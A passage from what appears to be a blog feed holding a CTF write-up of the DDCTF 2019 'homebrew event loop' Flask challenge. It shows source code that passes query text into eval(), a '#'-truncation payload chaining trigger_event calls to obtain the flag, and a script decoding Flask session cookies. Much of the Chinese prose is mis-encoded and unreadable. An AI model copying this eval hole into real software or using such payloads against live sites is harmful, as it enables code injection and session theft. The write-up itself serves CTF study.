punctuation">:</span>        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> haystack<span class="token keyword">class</span> <span class="token class-name">RollBackException</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">execute_event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    valid_event_chars <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>        <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>event_queue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>        event <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> event<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">,</span> <span class="token string">'func:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> event<span class="token punctuation">:</span>            <span class="token keyword">if</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> valid_event_chars<span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            is_action <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span>            action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>            args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action<span class="token operator">+</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                event_handler <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>                    action <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'_handler'</span> <span class="token keyword">if</span> is_action <span class="token keyword">else</span> <span class="token string">'_function'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                ret_val <span class="token operator">=</span> event_handler<span class="token punctuation">(</span>args<span class="token punctuation">)</span>            <span class="token keyword">except</span> RollBackException<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                resp <span class="token operator">+=</span> <span class="token string">'ERROR! All transactions have been cancelled. &lt;br />'</span>                resp <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>                session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>                session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span>                <span class="token keyword">break</span>            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> <span class="token string">''</span>                <span class="token comment"># resp += str(e) # only for debugging</span>                <span class="token keyword">continue</span>            <span class="token keyword">if</span> ret_val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>                    resp <span class="token operator">=</span> ret_val                <span class="token keyword">else</span><span class="token punctuation">:</span>                    resp <span class="token operator">+=</span> ret_val    <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> resp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'404 NOT FOUND'</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">return</span> resp<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">entry_point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    querystring <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_string<span class="token punctuation">)</span>    request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> querystring <span class="token operator">==</span> <span class="token string">''</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token keyword">not</span> querystring<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>querystring<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>        querystring <span class="token operator">=</span> <span class="token string">'action:index;False#False'</span>    <span class="token keyword">if</span> <span class="token string">'num_items'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>        session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    request<span class="token punctuation">.</span>prev_session <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span>    <span class="token keyword">return</span> execute_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># handlers/functions below --------------------------------------</span><span class="token keyword">def</span> <span class="token function">view_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    page <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    html <span class="token operator">=</span> <span class="token string">''</span>    html <span class="token operator">+=</span> <span class="token string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token string">'index'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23False">View source code&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;shop">Go to e-shop&lt;/a>&lt;br />'</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;reset">Reset&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'shop'</span><span class="token punctuation">:</span>        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:buy;1">Buy a diamond (1 point)&lt;/a>&lt;br />'</span>    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>        <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>        html <span class="token operator">+=</span> <span class="token string">'Session reset.&lt;br />'</span>    html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>    <span class="token keyword">return</span> html<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    bool_show_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    bool_download_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> bool_show_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>        source <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'eventLoop.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>        html <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23True">Download this .py file&lt;/a>&lt;br />'</span>            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>            <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>                    <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                html <span class="token operator">+=</span> line        source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> bool_download_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>            headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>            headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=serve.py'</span>            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> html    <span class="token keyword">else</span><span class="token punctuation">:</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">buy_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    num_items <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> num_items <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> num_items    trigger_event<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'func:consume_point;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>        num_items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'action:view;index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">consume_point_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    point_to_consume <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> point_to_consume<span class="token punctuation">:</span>        <span class="token keyword">raise</span> RollBackException<span class="token punctuation">(</span><span class="token punctuation">)</span>    session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> point_to_consume<span class="token keyword">def</span> <span class="token function">show_flag_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>    <span class="token keyword">return</span> <span class="token string">'You naughty boy! ;) &lt;br />'</span><span class="token keyword">def</span> <span class="token function">get_flag_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>        <span class="token comment"># show_flag_function has been disabled, no worries</span>        trigger_event<span class="token punctuation">(</span><span class="token string">'func:show_flag;'</span> <span class="token operator">+</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="è§£æ"><a href="#è§£æ" class="headerlink" title="è§£æ"></a>è§£æ</h3><p>å¤§äº5å°±å¯ä»¥æ‹¿åˆ°flagã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819152526783.png"></p><p>åœ¨è¿™ï¼Œæ˜¯å…ˆåŠ num_itemsï¼Œå†æ‰£pointï¼Œæ‰€ä»¥æ€è·¯ä¸ºï¼šbuy_handleræ‰§è¡Œnæ¬¡-&gt;get_flag-&gt;å†åˆ¤æ–­ä¸åˆæ³•ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819212251820.png"></p><p>é‡ç‚¹æ˜¯åœ¨è¿™é‡Œï¼Œå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç </p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819205352012.png"></p><p>ç„¶åæµ‹è¯•çœ‹çœ‹è¿™ä¸ª<code>get_mid_str()</code>æœ‰å•¥ç”¨</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819205437078.png"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> haystackevent <span class="token operator">=</span> <span class="token string">'action:ACTION;ARGS0#ARGS1#ARGS2'</span>action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action <span class="token operator">+</span> <span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>OUTPUT:</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819205449579.png"></p><p>evalå¯ä»¥æŠŠæ‹¼æ¥çš„å­—ç¬¦ä¸²å˜æˆå‡½æ•°èµ‹å€¼ç»™<code>event_handler</code></p><p>è€Œåœ¨evalé‡Œï¼Œåé¢æœ‰æ‹¼æ¥å­—ç¬¦ä¸²ï¼Œè¯¥å¦‚ä½•ç»•è¿‡å‘¢ï¼ŸåŠ ä¸ª#å³å¯ã€‚</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">testfoo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'NO'</span><span class="token punctuation">)</span>a <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'test'</span> <span class="token operator">+</span> <span class="token string">'foo'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'test#'</span> <span class="token operator">+</span> <span class="token string">'foo'</span><span class="token punctuation">)</span>a<span class="token punctuation">(</span><span class="token punctuation">)</span>b<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åé€»è¾‘å°±æ¸…æ™°äº†è®©eventä¸º</p><pre class="line-numbers language-none"><code class="language-none">action:trigger_event#;action:buy;2#action:buy;3#action:get_flag;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>äºæ˜¯</p><pre class="line-numbers language-none"><code class="language-none">action&#x3D;trigger_event#args&#x3D;[&#39;action:buy;2&#39;, &#39;action:buy;3&#39;, &#39;action:get_flag;&#39;, &#39;&#39;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åå¤è°ƒç”¨è‡ªå·±ï¼Œæ‰§è¡Œå¤šä¸ªå‡½æ•°è·å–flagã€‚</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?action:trigger_event%23;action:buy;2%23action:buy;3%23action:get_flag;%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819214528531.png"></p><p>flagå·²ç»å†™å…¥åˆ°sessioné‡Œäº†ï¼Œè·å–ä¸€ä¸‹</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819215500512.png"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819215513386.png"></p><h3 id="sessionè§£å¯†"><a href="#sessionè§£å¯†" class="headerlink" title="sessionè§£å¯†"></a>sessionè§£å¯†</h3><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">å®¢æˆ·ç«¯ session å¯¼è‡´çš„å®‰å…¨é—®é¢˜</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                        <span class="token string">'an exception'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                            <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token string">'.eJyNjUtrg0AURv9KuWsXEwcJCm5KG0lpR5JKx7khFB_BR7wTQW2TCf73ZlNCwIW7D87hfFdoTgV4u90VnlLwQEnBEukOIb0tDlF3gdGaJmaK5E2-cikNVjr89f27AePe-n9A_TUo09ap7ZhcLpqYP_8k0mGhWfsTTY0txtnyZhwxLvx5pY-ZpceQSQKXxzZ2SmZLpHOJvD8KUmeMCgcrZgsS9B5tS1W_9mGwvuAns5FEKV42jqgzLqLcnXcMeqDvqj9QBx6zoD1Vur9NPv4B7999zw.YR5gXg.LSzgKfQXTt9mIfaikeWHQTkAxZg'</span>decryption<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-DDCTF-2019-homebrew-event-loop/image-20210819215404908.png"></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[b01lers2020]Life on Mars</title>
      <link href="/p/2559628216.html"/>
      <url>/p/2559628216.html</url>
      
